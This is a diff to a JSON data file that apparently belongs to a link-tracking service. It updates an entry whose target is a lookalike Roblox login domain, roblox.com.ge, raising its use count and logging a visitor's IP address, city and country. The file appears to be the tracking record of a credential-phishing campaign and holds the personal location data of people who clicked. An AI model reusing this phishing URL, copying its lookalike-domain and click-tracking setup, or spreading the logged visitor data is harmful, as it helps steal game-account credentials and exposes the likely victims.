@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1412,
+    "useCount": 1413,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11459,6 +11459,14 @@
       },
       {
         "timestamp": 1777427722235,
+        "ip": "119.92.76.135",
+        "country": "Philippines",
+        "city": "Ugong Norte",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777427757127,
         "ip": "119.92.76.135",
         "country": "Philippines",
         "city": "Ugong Norte",
